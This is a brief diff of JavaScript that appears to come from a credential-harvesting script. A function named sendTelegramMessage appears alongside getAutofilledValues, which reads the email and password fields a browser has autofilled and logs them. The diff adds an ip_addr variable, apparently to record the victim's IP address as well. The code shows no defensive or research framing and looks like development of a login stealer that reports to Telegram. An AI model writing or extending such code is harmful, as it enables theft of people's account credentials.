@@ -20,6 +20,7 @@ function sendTelegramMessage(message) {
 function getAutofilledValues() { 
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
+    var ip_addr;
 
     console.log('Autofilled Email:', email); 
     console.log('Autofilled Password:', password); 
